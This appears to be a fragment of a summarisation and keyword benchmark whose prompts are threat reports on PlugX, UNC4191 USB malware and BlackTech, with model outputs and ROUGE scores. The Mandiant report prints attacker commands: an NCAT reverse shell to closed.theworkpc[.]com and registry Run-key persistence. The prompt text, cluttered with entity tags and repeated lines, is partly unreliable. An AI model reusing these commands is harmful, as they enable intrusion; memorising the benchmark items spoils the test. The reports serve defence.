[ORG] RAR file containing PlugX ( [ORG] HU proposals to the draft EUCO conclusions.rar ) Malicious shortcut file that executes PlugX ( [ORG] HU proposals to the draft EUCO conclusions.pdf.lnk ) Malicious shortcut file that executes PlugX ( [ORG] HU proposals to the draft EUCO conclusions.pdf.lnk ) Malicious shortcut file that executes PlugX ( [ORG] HU proposals to the draft EUCO conclusions.pdf.lnk ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Encrypted PlugX payload ( operaDB.dat)Encrypted PlugX payload ( operaDB.dat)Encrypted PlugX payload ( operaDB.dat ) Malicious [ORG] RAR file containing PlugX ( [ORG] EL [ORG] Non- [ORG] Paper [ORG] Pandemic [ORG] Resilience final.rar ) Malicious [ORG] RAR file containing PlugX ( [ORG] EL [ORG] Non- [ORG] Paper [ORG] Pandemic [ORG] Resilience final.rar ) Malicious [ORG] RAR file containing PlugX ( [ORG] EL [ORG] Non- [ORG] Paper [ORG] Pandemic [ORG] Resilience final.rar ) Malicious shortcut file that executes PlugX ( [ORG] EL Non - [ORG] Paper [ORG] Pandemic [ORG] Resilience final.docx.lnk ) Malicious shortcut file that executes PlugX ( [ORG] EL Non - [ORG] Paper [ORG] Pandemic [ORG] Resilience final.docx.lnk ) Malicious shortcut file that executes PlugX ( [ORG] EL Non - [ORG] Paper [ORG] Pandemic [ORG] Resilience final.docx.lnk ) Malicious [ORG] DLL that loads [LOC] PlugX ( Adobe_Caps.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( Adobe_Caps.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( Adobe_Caps.dll ) Encrypted PlugX payload ( AdobePlugin.dat)Encrypted PlugX payload ( AdobePlugin.dat)Encrypted PlugX payload ( AdobePlugin.dat)8/11IndicatorType hashContextMalicious [ORG] RAR file containing [LOC] PlugX ( 313615_MONTENEGRO-2021 - HUMAN- RIGHTS-REPORT.rar ) Malicious [ORG] RAR file containing [LOC] PlugX ( 313615_MONTENEGRO-2021 - HUMAN- RIGHTS-REPORT.rar ) Malicious [ORG] RAR file containing [LOC] PlugX ( 313615_MONTENEGRO-2021 - HUMAN- RIGHTS-REPORT.rar ) Malicious shortcut file that executes [LOC] PlugX ( 313615_MONTENEGRO-2021 - HUMAN- [CARDINAL] RIGHTS-REPORT.pdf.lnk ) Malicious shortcut file that executes [LOC] PlugX ( 313615_MONTENEGRO-2021 - HUMAN- [CARDINAL] RIGHTS-REPORT.pdf.lnk ) Malicious shortcut file that executes [LOC] PlugX ( 313615_MONTENEGRO-2021 - HUMAN- [CARDINAL] RIGHTS-REPORT.pdf.lnk ) Malicious [ORG] DLL that loads [LOC] PlugX ( goopdate.dll)Malicious [ORG] DLL that loads [LOC] PlugX ( goopdate.dll)Malicious [ORG] DLL that loads [LOC] PlugX ( goopdate.dll)Encrypted PlugX payload ( AvastDB.dat)Encrypted PlugX payload ( AvastDB.dat)Encrypted PlugX payload ( AvastDB.dat ) Malicious [ORG] RAR file containing [LOC] PlugX ( [DATE] EU [DATE] 31st session of [ORG] the [ORG] Commission [ORG] on [ORG] Crime [ORG] Prevention [ORG] and [ORG] Criminal [ORG] Justice [ORG] United [ORG] Nations [ORG] on [ORG] Drugs and [ORG] Crime.rar ) Malicious [ORG] RAR file containing [LOC] PlugX ( [DATE] EU [DATE] 31st session of [ORG] the [ORG] Commission [ORG] on [ORG] Crime [ORG] Prevention [ORG] and [ORG] Criminal [ORG] Justice [ORG] United [ORG] Nations [ORG] on [ORG] Drugs and [ORG] Crime.rar ) Malicious [ORG] RAR file containing [LOC] PlugX ( [DATE] EU [DATE] 31st session of [ORG] the [ORG] Commission [ORG] on [ORG] Crime [ORG] Prevention [ORG] and [ORG] Criminal [ORG] Justice [ORG] United [ORG] Nations [ORG] on [ORG] Drugs and [ORG] Crime.rar ) Malicious shortcut file that executes [LOC] PlugX ( [DATE] EU [DATE] 31st session of [ORG] the [ORG] Commission [ORG] on [ORG] Crime [ORG] Prevention [ORG] and [ORG] Criminal [ORG] Justice [ORG] United [ORG] Nations [ORG] on [ORG] Drugs [ORG] and [ORG] Crime.pdf.lnk ) Malicious shortcut file that executes [LOC] PlugX ( [DATE] EU [DATE] 31st session of [ORG] the [ORG] Commission [ORG] on [ORG] Crime [ORG] Prevention [ORG] and [ORG] Criminal [ORG] Justice [ORG] United [ORG] Nations [ORG] on [ORG] Drugs and Crime.pdf.lnk)9/11IndicatorTypeContextMalicious shortcut file that executes [LOC] PlugX ( [DATE] EU [DATE] 31st session of [ORG] the [ORG] Commission [ORG] on [ORG] Crime [ORG] Prevention [ORG] and [ORG] Criminal [ORG] Justice [ORG] United [ORG] Nations [ORG] on [ORG] Drugs [ORG] and [ORG] Crime.pdf.lnk ) Malicious [ORG] DLL that loads [LOC] PlugX ( goopdate.dll)Malicious [ORG] DLL that loads [LOC] PlugX ( goopdate.dll)Malicious [ORG] DLL that loads [LOC] PlugX ( goopdate.dll)Encrypted PlugX payload ( AvastDB.dat)Encrypted PlugX payload ( AvastDB.dat)Encrypted PlugX payload ( AvastDB.dat ) Malicious [ORG] RAR file containing [PERSON] PlugX ( NV 309- [DATE] 2022 HMA 's departure.pdf.rar ) Malicious [ORG] RAR file containing [PERSON] PlugX ( NV 309- [DATE] 2022 HMA 's departure.pdf.rar ) Malicious [ORG] RAR file containing [PERSON] PlugX ( NV 309- [DATE] 2022 HMA 's departure.pdf.rar ) Malicious shortcut file that executes PlugX ( NV 309 - 2022 HMA 's departure.pdf.lnk ) Malicious shortcut file that executes PlugX ( NV 309 - 2022 HMA 's departure.pdf.lnk ) Malicious shortcut file that executes PlugX ( NV 309 - 2022 HMA 's departure.pdf.lnk ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) address PlugX C2 server IP address PlugX C2 server IP", "generated_text": "the report; a PlugX malware campaign; government officials; Europe; the Middle East; South America; the malware; RAR archive files; the shortcut; a malicious DLL; a payload; a command; control; a command; the C2 server; tasking; additional plugins; its capabilities; information gathering; the threat group; shellcode; naming schemes; malicious files; the distribution; APT; the malware; a command; Windows shortcut; C2 server; command; RAT; Command; servers; C2 servers; a command; information; the threat; DES; countries; Europe; the Middle East; South America.", "ref_text": "<START-1>The PDF describes research from Secureworks on a cyberespionage campaign targeting government officials in Europe, the Middle East, and South America. The threat actor uses Windows shortcut files contained in RAR archives that execute PlugX malware when opened. PlugX is a modular malware that can download additional plugins to enhance its capabilities beyond basic information gathering. The malware is embedded within RAR archive files and drops a decoy document to the logged-on user's %Temp% directory when executed. Analysis of the malware attributes the campaign to BRONZE PRESIDENT, a Chinese state-sponsored group. Tactics align with previous BRONZE PRESIDENT activity, including decoy documents about political issues, file paths, shellcode obfuscation, and PlugX modules. The malware achieves persistence using Run registry keys and credential theft for lateral movement. Network traffic goes to command and control servers hosted on infrastructure previously linked to BRONZE PRESIDENT. The decoy documents suggest the group is gathering intelligence on China's interests in the targeted regions. The malware evolves over time and BRONZE PRESIDENT continuously pivots to new targets for fresh intelligence requirements. The payload copies three files to a ProgramData subdirectory using a naming scheme unique to previous BRONZE PRESIDENT campaigns. The report concludes that government entities, especially those related to China's geopolitical interests, should closely monitor BRONZE PRESIDENT. Protection requires proactive threat hunting, restricting access to indicators of compromise, and updating defenses against PlugX malware. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5329949238578681, "gpt3/lexical/rouge_rouge2": 0.20408163265306123, "gpt3/lexical/rouge_rougeL": 0.2639593908629442, "gpt3/lexical/rouge_rougeLsum": 0.2639593908629442, "gpt3_generated_text": ["The article discusses a recent PlugX malware campaign that targeted government officials in Europe, the Middle East, and South America. The campaign was likely conducted by the Chinese government-sponsored threat group known as BRONZE PRESIDENT. The malware was distributed through RAR archive files, with a Windows shortcut file masquerading as a document. When the recipient clicked on the shortcut file, it executed a legitimate file contained in a hidden folder, alongside a malicious DLL and an encrypted payload file. The payload had politically-themed decoy documents and used file paths and naming schemes previously used by BRONZE PRESIDENT. The malware communicated with a command and control (C2) server for tasking and could download additional plugins to enhance its capabilities. The article emphasizes the use of decoy documents, the presence of shellcode, and the tiered folder structure to bypass scanning products. The researchers observed that the malware named the legitimate executable with the pattern used in previous BRONZE PRESIDENT PlugX campaigns."]}, {"split_name": "val", "sample_id": "val_20", "prompt_text": "Extract the keywords: www.mandiant.com /resources / blog / china - nexus - espionage - southeast - asia Always [WORK_OF_ART] Another Secret : [WORK_OF_ART] Lifting [WORK_OF_ART] the [WORK_OF_ART] Haze [WORK_OF_ART] on [WORK_OF_ART] China [WORK_OF_ART] - nexus [WORK_OF_ART] Espionage in Southeast AsiaMandiant Managed Defense recently identified cyber espionage activity that heavily leverages [ORG] USB devices as an initial infection vector and concentrates on the [GPE] Philippines . Mandiant tracks this activity as [ORG] UNC4191 and we assess it has a [GPE] China nexus . UNC4191 operations have affected a range of public and private sector entities primarily in [LOC] Southeast [LOC] Asia and extending to the [GPE] U.S. , [LOC] Europe , and [ORG] APJ ; however , even when targeted organizations were based in other locations , the specific systems targeted by [ORG] UNC4191 were also found to be physically located in the [GPE] Philippines . Following initial infection via [ORG] USB devices , the threat actor leveraged legitimately signed binaries to side- load malware , including [CARDINAL] three new families we refer to as [ORG] MISTCLOAK , [ORG] DARKDEW , and [ORG] BLUEHAZE . Successful compromise led to the deployment of a renamed [ORG] NCAT binary and execution of a reverse shell on the victim \u2019s system , providing backdoor access to the threat actor . The malware self - replicates by infecting new removable drives that are plugged into a compromised system , allowing the malicious payloads to propagate to additional systems and potentially collect data from air - gapped systems . Mandiant Managed Defense performs continuous threat hunting for customers , discovering evidence of new tactics , techniques , and procedures ( TTPs ) that can evade traditional detection mechanismsIn response to this campaign , [ORG] Mandiant deployed new real - time detections , enhancing [ORG] Managed [ORG] Defense \u2019s protection for our customers from future similar activity . Our [ORG] Adversary [ORG] Operations team created and deployed [ORG] YARA rules and [ORG] Mandiant [ORG] Security [ORG] Validation [ORG] Actions , shared at the end of the post . This blog post details our initial threat hunting discovery , the newly identified malware families , detection opportunities , and [ORG] Mandiant \u2019s assessment about the goals and motivations of the threat actor . [PERSON] Malware [PERSON] ObservedMandiant observed [ORG] UNC4191 deploy the following malware families . Descriptionpayload stored in a file on disk . Table [CARDINAL] 1 : UNC4191 Malware FamiliesMalware Family MISTCLOAK MISTCLOAK is a launcher written in [LANGUAGE] C++ that executes an encrypted executable [ORG] BLUEHAZE [ORG] BLUEHAZE is a launcher written in C / C++ that launches a copy of [ORG] NCAT to create a DARKDEW [ORG] DARKDEW is a dropper written in [LANGUAGE] C++ that is capable of infecting removable drives . [ORG] NCAT is a command - line networking utility that was written for [ORG] the [ORG] Nmap [ORG] Project to [ORG] NCAT perform a wide - variety of security and administration tasks . While [ORG] NCAT may be used for legitimate purposes , threat actors may also use it to upload or downloadreverse shell to a hardcoded command and control ( C2).1/12files , create backdoors or reverse shells , and tunnel traffic to evade network controls . Initial DetectionMandiant Managed Defense customers receive [ORG] Mandiant \u2019s dedicated proactive [ORG] Threat [ORG] Hunting service . [ORG] Mandiant 's threat hunting team leverages the MITRE ATT&CK \u00ae framework as a guide for developing [ORG] Hunt [ORG] Missions that examine endpoint telemetry data , such as process events , for collection and [PERSON] ATT&CK technique ID tagging . The resulting threat hunting data set provides the team with wide visibility across the customer base . When performing analysis , we augment this data set with more targeted sources , like custom , real - time alerting from our customers \u2019 endpoint detection and response ( [ORG] EDR ) technologies . Mandiant uses custom tooling to identify [PERSON] ATT&CK technique sequences and clusters associated with common threat actor behaviors . A technique sequence is useful for identifying events with a defined order of execution , such as the creation of a local account ( T1136.001 ) and then addition to the local [ORG] Administrators group ( T1098 ) . A technique cluster identifies a grouping of techniques that do n\u2019t necessarily occur in a specific order . By focusing on technique sequences and clusters , we reduce the amount of data that needs to be manually reviewed by analysts . For example , [ORG] Mandiant has observed threat actors enumerating domain trusts ( [ORG] T1482 ) and querying domain and local group permissions ( [GPE] T1069.001 , [GPE] T1069.002 ) within [TIME] a [TIME] several [TIME] minute [TIME] span ( Figure [CARDINAL] 1 ) . The combined event count for these [CARDINAL] three techniques occurring on their own can number in the [CARDINAL] hundreds [CARDINAL] of [CARDINAL] thousands , but by applying technique sequencing or clustering we can reduce the number of interesting events to a manageable amount.2/12Figure [CARDINAL] 1 : Visualization of technique sequencing and clustering conceptsMandiant identified this [ORG] UNC4191 campaign by searching for anomalous sequences of events under our \u201c Mandiant Intelligence : Staging Directories \u201d and \u201c [WORK_OF_ART] Command [WORK_OF_ART] and [WORK_OF_ART] Scripting Interpreter : [WORK_OF_ART] Windows [WORK_OF_ART] Command [WORK_OF_ART] Shell ( T1059.003 ) \u201d hunting missions ( Figure [CARDINAL] 2).3/12Figure 2 : Technique sequence that led to UNC4191 detectionThe techniques performed by [ORG] UNC4191 led to the development of additional technique sequences and detection opportunities , as described in the Detection Opportunities section . UNC4191 Malware Infection CycleThe overall infection cycle from this campaign can be split into [CARDINAL] three distinct phases , shown in Figure [CARDINAL] 3.4/12Figure [CARDINAL] 3 : UNC4191 malware infection cyclePHASE I : MISTCLOAKThe infection chain begins when a user plugs in a compromised removable device and manually executes a renamed signed binary from the root directory of the storage volume ( T1091 ) . The initial binaries \u2014 named Removable [ORG] Drive.exe or [ORG] USB [ORG] Drive.exe \u2014 are versions of a legitimately signed application called [PRODUCT] USB [PRODUCT] Network [PRODUCT] Gate , developed by the company [ORG] Electronic Team , [ORG] Inc. These are used to side - load the [ORG] MISTCLOAK malware that impersonates a legitimate [ORG] DLL ( Table 2).Table 2 : Legitimate USB Network Gate binaries used toside - load MISTCLOAK malware directory on the removable device ( T1574.002 ) ( Table 3 ) . MISTCLOAK is a launcher for the encrypted file usb.ini , which [ORG] MISTCLOAK reads from the current directory or the path autorun.inf\\Protection for Autorun\\System Volume Information\\usb.ini . Mandiant identified the [ORG] PDB file path [PERSON] G:\\project\\APT\\U [PERSON] \\new\\shellcode\\Release\\shellcode.pdb in the [ORG] MISTCLOAK sample . Notably , the [NORP] Chinese characters   Hijacking\\new\\u2ec\\Release\\u2ec.pdb)5/12MISTCLOAK then opens Windows Explorer to the location on the removable device where the user files are stored with the command \u2018 explorer.exe \" < drive>:\\autorun.inf\\Protection for Autorun\"\u2019 . Phase II : DARKDEWThe file usb.ini contains an encrypted [ORG] DLL payload called [ORG] DARKDEW that is capable of infecting removable drives . If executed from a removable drive , [ORG] DARKDEW will launch explorer.exe via ` explorer.exe \u201c < drive>:\\autorun.inf\\Protection for Autorun \u201d ` where < drive > is a removable drive letter , such as \u201c E \u201d . [ORG] DARKDEW will then check if either [ORG] C:\\ProgramData\\udisk\\disk_watch.exe or C:\\ProgramData\\udisk\\DateCheck.exe exist and will create the directory C:\\ProgramData\\udisk if neither Volume Information\\ to C:\\ProgramData\\udisk\\. [PERSON] Mandiant identified files in this directory , such as [FAC] Removable [FAC] Drive ( [CARDINAL] 16GB).lnk , that originated from a system that was previously compromised by [ORG] DARKDEW ( [GPE] T1074.001 ) and copied to a [ORG] USB device . The copied data includes the files shown in [LAW] Table [LAW] 5 and arbitrary files with the extensions : xlsx , docx , mp4 , device , jpg , pptx , pdf , txt , and lnk files . Table 5 : Files that are copied by [ORG] DARKDEW from the removable drive to a compromisedsystemC:\\ProgramData\\udisk\\disk_watch.exeC:\\ProgramData\\udisk\\libeay32.dllC:\\ProgramData\\udisk\\Removable Disk.exeC:\\ProgramData\\udisk\\rzlog4cpp.dllC:\\ProgramData\\udisk\\rzlog4cpp_logger.dllC:\\ProgramData\\udisk\\ssleay32.dllC:\\ProgramData\\udisk\\u2ec.dllC:\\ProgramData\\udisk\\USB Drive.exeC:\\ProgramData\\udisk\\usb.iniC:\\ProgramData\\udisk\\UsbConfig.exe6/12C:\\ProgramData\\udisk\\wuwebv.exeC:\\ProgramData\\udisk\\DateCheck.exeC:\\ProgramData\\udisk\\example.jpgC:\\ProgramData\\udisk\\example.xlsxDARKDEW will then copy the renamed [ORG] USB [ORG] Network [ORG] Gate binary ( e.g. , Removable Drive.exe ) to C:\\ProgramData\\udisk\\disk_watch.exe and create persistence with a registry key value named udisk under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ( T1547.001 ) . Finally , [ORG] DARKDEW will launch a file named C:\\ProgramData\\udisk\\DateCheck.exe and then exit . Table [CARDINAL] 6 : [ORG] DARKDEW registry persistenceKey : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunValue : udiskText : c:\\programdata\\udisk\\disk_watch.exeIf [ORG] DARKDEW is executed from a non - removable drive , the behavior is slightly different . [ORG] DARKDEW will create the directory C:\\ProgramData\\udisk\\ , then copy every file in the current directory of the parent executable to C:\\ProgramData\\udisk\\. It will then copy the parent executable to C:\\ProgramData\\udisk\\disk_watch.exe and launch it . The persistence mechanism is identical , and it will also launch C:\\ProgramData\\udisk\\DateCheck.exe . When [ORG] DARKDEW is executed within the context of disk_watch.exe , the malware will scan the system [TIME] every [TIME] 10 [TIME] seconds for removable drives by enumerating volumes from A to Z until it finds one that is removable . The [ORG] DARKDEW malware then creates the directory < drive>\\autorun.inf\\Protection for Autorun\\ , sets its attribute to hidden , and copies the contents of the current working directory of disk_watch.exe to that directory or the subdirectory < drive>:\\autorun.inf\\Protection for Autorun\\System Volume Information\\. This capability appears to be a method for self - replication and to transfer files that may be collected from air - gapped systems . Phase III : BLUEHAZEThe binary [ORG] DateCheck.exe is a renamed version of a legitimate , signed application called [PERSON] Razer registry key value ACNTV under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ( T1547.001 ) for persistence . Next , [ORG] BLUEHAZE copies all the files from its working directory to C:\\Users\\Public\\Libraries\\CNNUDTV\\ and then executes a renamed [ORG] NCAT executable wuwebv.exe to create a reverse shell to the hard - coded command and control ( C2 ) address : closed[.]theworkpc[.]com:80 ( T1059 ) . [ORG] Mandiant has not observed evidence of reverse shell interaction ; however , based on the age of the activity , this may be a result of visibility gaps or short log retention periods.DateCheck.exe > Table 9 : BLUEHAZE command execution\"cmd.exe /C reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v ACNTV /t REG_SZ /d \\\"Rundll32.exe [ORG] SHELL32.DLL , ShellExec_RunDLL \\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\ \" /f\"cmd.exe /c copy * . * C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\\"cmd.exe /C wuwebv.exe -t -e c:\\\\windows\\\\system32\\\\cmd.exe closed.theworkpc[.]com 80 Outlook and [ORG] ImplicationsBased on available data , such as [ORG] PE compile timestamps for the malware involved in the aforementioned activity , this campaign potentially extends back to [DATE] September [DATE] 2021 . Given the worming nature of the malware involved , we may have detected the later stages of this malware \u2019s proliferation . We believe this activity showcases [NORP] Chinese operations to gain and maintain access to public and private entities for the purposes of intelligence collection related to [GPE] China \u2019s political and commercial interests . Our observations suggest that entities in the [GPE] Philippines are the main target of this operation based on the number of affected systems located in this country that were identified by [ORG] Mandiant . Campaign TrackingMandiant will continue to monitor [ORG] UNC4191 \u2019s campaign and will provide notable and dynamic updates regarding changes in tactics and techniques , the introduction of tools with new capabilities , or the use of8/12new infrastructure to carry out their mission . For more insights into how [ORG] Mandiant tracks this and similar campaigns , see our [GPE] Threat [GPE] Campaigns feature within [ORG] Mandiant [ORG] Advantage [ORG] Threat [ORG] Intelligence . Detection OpportunitiesEach Mandiant threat hunting discovery is evaluated for opportunities to create new real - time detections . These detections help Mandiant identify additional activity across our customers \u2019 environments for rapid escalation and triage analysis and aim to reduce threat actor dwell time . Following our initial campaign discovery , we immediately searched the entire [PRODUCT] Managed [PRODUCT] Defense customer base for any activity that matched our atomic indicators of interest , including filenames , file paths , file hashes , [ORG] IP addresses , domains , and other artifacts . This uncovered activity on systems at multiple customers . Additionally , we also created or updated real - time Managed Defense detections to identify threat actor methodologies , such as : Deployment or usage of [GPE] NETCAT and [ORG] NCAT reverse shellsModification of registry [PERSON] Run keys for malware persistence , with arguments configured to execute the Windows binary rundll32.exeProcesses launched from the C:\\Users\\Public\\Libraries\\ directoryBy combining [ORG] Mandiant \u2019s threat intelligence service with [ORG] Managed [ORG] Defense \u2019s detection engineering and threat hunting capabilities , we can rapidly identify and provide context around malicious activity . Detection Opportunity NCAT reverse shell execution arguments [GPE] Parent or grandparent processes executing from Non [ORG] - C:\\ [ORG] Drive RootMITRE ATT&CK Event Details T1036D:\\USB Drive.exewuwebv.exe -t -e c:\\\\windows\\\\system32\\\\cmd.exe closed.theworkpc[.]com [CARDINAL] 80 Process : Child Processes :> explorer.exe \" D:\\autorun.inf\\Protection for Autorun \" > c:\\programdata\\udisk\\disk_watch.exe > c:\\programdata\\udisk\\DateCheck.exeGrandchild Processes :> > \" cmd.exe /C reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v ACNTV /t REG_SZ /d \\\"Rundll32.exe [ORG] SHELL32.DLL , [NORP] ShellExec_RunDLL9/12\\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\ \" /f \" > > cmd.exe /c copy * . * C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\ \" > > cmd.exe /C wuwebv.exe -t -e c:\\\\windows\\\\system32\\\\cmd.exe closed.theworkpc[.]com 80 Registry Key : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunValue : udiskText : c:\\programdata\\udisk\\disk_watch.exe reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v ACNTV /t REG_SZ /d \\\"Rundll32.exe [ORG] SHELL32.DLL , ShellExec_RunDLL \\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\ \" /f \" OriginalFileName : UsbConfig.exeRegistry [PERSON] Run key persistence for binary in PROGRAMDATAT1060Registry [PERSON] Run key T1060File name of executing process does n\u2019t match original nameT1036 , T1574.002File Name : Removable Disk.exe , [ORG] USB Drive.exeOriginalFileName : RzCefRenderProcess.exeWindows Explorer process execution with folder path specified on command lineFile Name : DateCheck.exe Parent Process Path : D:\\USB Drive.exeT1091Process : explorer.exeCommand Line : explorer.exe \" D:\\autorun.inf\\Protection for Autorun\"Mandiant Security Validation ActionsOrganizations can validate their security controls using the following actions with [ORG] Mandiant [ORG] Security [ORG] Validation . NameVID A105 - 454 [ORG] Protected [ORG] Theater [ORG] - [ORG] UNC4191 , [ORG] BLUEHAZE , [ORG] Execution , Variant # 1 A105 - 455 Protected Theater - UNC4191 , [ORG] DARKDEW , Execution , Variant # 1 A105 - 466 Command and [ORG] Control [ORG] - [ORG] UNC4191 , [ORG] DNS [ORG] Query , Variant # 1 author = \" Mandiant\"10/12strings : $ [MONEY] s1 = \" CheckUsbService \" ascii $ s2 = \" new\\\\u2ec\\\\Release\\\\u2ec.pdb \" ascii $ s3 = \" autorun.inf\\\\Protection for Autorun \" ascii condition : uint16(0 ) = = [CARDINAL] 0x5a4d and filesize < [CARDINAL] 200 [PERSON] KB and ( [CARDINAL] 2 of ( $ [MONEY] s * ) ) $ s1 = \" do inroot \" ascii $ s2 = \" disk_watch \" ascii $ s5 = \" G:\\\\project\\\\APT\\\\ \" ascii $ s3 = \" c:\\\\programdata\\\\udisk \" ascii $ s4 = \" new\\\\shellcode\\\\Release\\\\shellcode.pdb \" ascii condition : filesize < [CARDINAL] 500 [PERSON] KB and ( [CARDINAL] 2 of ( $ [MONEY] s * ) ) $ s1 = \" [ORG] Libraries\\\\CNNUDTV \" ascii $ s2 = \" closed.theworkpc.com \" ascii $ s3 = \" cmd.exe /C wuwebv.exe -t -e \" ascii condition:11/12uint16(0 ) = = [CARDINAL] 0x5a4d and filesize < [CARDINAL] 500 [PERSON] KB and ( [CARDINAL] 2 of ( $ [MONEY] s * ) ) } Indicators of CompromiseDescription NCAT C2ValueType Domain closed.theworkpc[.]com DLL Side - Loading ) Razer Chromium Render Process ( Legitimate Binary used for [ORG] DLL Side [ORG] - Loading ) AcknowledgementsSpecial thanks to [PERSON] Tobias [PERSON] Krueger and [PERSON] Conor [PERSON] Quigley for their assistance with analyzing the [ORG] MISTCLOAK , [ORG] DARKDEW , and [ORG] BLUEHAZE samples and [PERSON] Matthew [PERSON] Hoerger for creating [ORG] Mandiant [ORG] Security [ORG] Validation ( [ORG] MSV ) actions . We would also like to thank [PERSON] Tim [PERSON] Martin , [PERSON] Alexander [PERSON] Pennino , [PERSON] Nick [PERSON] Richard , and [PERSON] Sarah [PERSON] Hawley for their technical review and feedback.12/12", "generated_text": "Mandiant Managed Defense; UNC4191; Philippines; USB devices; an initial infection vector; the Philippines; USB devices; malware; MISTCLOAK; DARKDEW; BLUEHAZE; BLUEHAZE; a reverse shell; a USB drive; a payload; new removable drives; the victim; new removable drives; a compromised system; the malware self-replicates; new removable drives; additional systems; data; air-gapped systems; Mandiant Security; Validation Actions; Targeted, proactive threat hunting; research; YARA rules; YARA rules; techniques; procedures; TTPs; evade detection; YARA rules; Practice; techniques; human rights; threatening behavior.", "ref_text": "<START-1>The PDF describes a cyberespionage campaign called UNC4191 that targeted organizations primarily in Southeast Asia, as well as some in the US, Europe, and Asia Pacific. The threat actor has a suspected China nexus. Initial infection vectored used USB devices. Malicious binaries named USB Drive.exe or Removable Drive.exe were executed by users when plugging in compromised USB drives. The binaries sideloaded and executed the malware MISTCLOAK, DARKDEW, and BLUEHAZE. MISTCLOAK decrypts and executes DARKDEW from an encrypted file on the USB drive. DARKDEW self-replicates by infecting any new USB drives plugged into the compromised system. It steals data from air-gapped systems this way. BLUEHAZE uses a signed binary to sideload itself. It opens a reverse shell to a command and control server using NCAT. Successful compromise allows the threat actor to maintain persistent access and carry out intelligence collection. The campaign appears to have started around September 2021 based on compile timestamps of the malware samples. New detections were created in Managed Defense to identify this activity, enabling rapid response. Indicators of compromise are provided. Mandiant will continue monitoring the campaign and provide updates on changes in TTPs or new tools. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.49282296650717705, "gpt3/lexical/rouge_rouge2": 0.1778846153846154, "gpt3/lexical/rouge_rougeL": 0.24880382775119617, "gpt3/lexical/rouge_rougeLsum": 0.24880382775119617, "gpt3_generated_text": ["The article discusses cyber espionage activity identified by Mandiant Managed Defense, which heavily leverages USB devices as an initial infection vector and primarily targets the Philippines. The campaign, known as UNC4191, has affected public and private sector entities in Southeast Asia, as well as the US, Europe, and APJ. After initial infection via USB devices, the threat actor uses legitimately signed binaries to load malware, including three new families called MISTCLOAK, DARKDEW, and BLUEHAZE. Successful compromise leads to the deployment of a renamed NCAT binary and the execution of a reverse shell, providing backdoor access to the threat actor. The malware self-replicates by infecting new removable drives, allowing it to propagate to additional systems and potentially collect data from air-gapped systems. In response to this campaign, Mandiant has deployed new real-time detections and enhanced its protection for customers. The article also provides details about the malware families, detection opportunities, and Mandiant's assessment of the threat actor's goals and motivations. Mandiant uses targeted, proactive threat hunting and research to discover new tactics, techniques, and procedures (TTPs) that can evade traditional detection mechanisms. The company has developed YARA rules and Mandiant Security Validation Actions to detect and mitigate similar activity in the future. Overall, the article highlights the ongoing threat of cyber espionage and the importance of proactive defense measures."]}, {"split_name": "val", "sample_id": "val_21", "prompt_text": "Extract the keywords: [ORG] Trend [ORG] MicroAbout [ORG] TrendLabs [ORG] Security Intelligence BlogGo to \u2026 \u25bc [ORG] Home [ORG] \u00bb Targeted Attacks \u00bb Following the Trail of [ORG] BlackTech \u2019s Cyber Espionage CampaignsFollowing the Trail of [ORG] BlackTech \u2019s Cyber Espionage CampaignsPosted on : [DATE] June 22 , [DATE] 2017 at [TIME] 5:05 [TIME] amPosted in : Targeted Attacks Author : [GPE] TrendMicro3by [PERSON] Lenart [PERSON] Bermejo , [PERSON] Razor [PERSON] Huang , and CH Lei ( Threat Solution Team)BlackTech is a cyber espionage group operating against targets in [LOC] East [LOC] Asia , particularly [GPE] Taiwan , and occasionally , [GPE] Japan and [GPE] Hong [GPE] Kong . Based on the mutexes and domain names of some of their [ORG] C&C servers , [ORG] BlackTech \u2019s campaigns are likely designed to steal their target \u2019s technology . Following their activities and evolving tactics and techniques helped us uncover the proverbial red string of fate that connected [CARDINAL] three seemingly disparate campaigns : [ORG] PLEAD , [PERSON] Shrouded [PERSON] Crossbow , and of late , Waterbear . Over the course of their campaigns , we analyzed their modus operandi and dissected their tools of the trade \u2014 and uncovered common denominators indicating that [ORG] PLEAD , [PERSON] Shrouded [PERSON] Crossbow , and [ORDINAL] Waterbear may actually be operated by the same group . PLEAD PLEAD is an information theft campaign with a penchant for confidential documents . Active since [DATE] 2012 , it has so far targeted [NORP] Taiwanese government agencies and private organizations . [ORG] PLEAD \u2019s toolset includes the self - named PLEAD backdoor and the [ORG] DRIGO exfiltration tool . [ORG] PLEAD uses spear - phishing emails to deliver and install their backdoor , either as an attachment or through links to cloud storage services . Some of the cloud storage accounts used to deliver [ORG] PLEAD are also used as drop off points for exfiltrated documents stolen by DRIGO.PLEAD \u2019s installers are disguised as documents using the right - to - left - override ( RTLO ) technique to obfuscate the malware \u2019s filename . They are mostly accompanied by decoy documents to further trick users . We \u2019ve also seen [ORG] PLEAD use exploits for these vulnerabilities : CVE-2015 - 5119 , patched by [ORG] Adobe [DATE] last July , [DATE] 2015 CVE-2012 - 0158 , patched by [ORG] Microsoft [DATE] last [DATE] April , [DATE] 2012 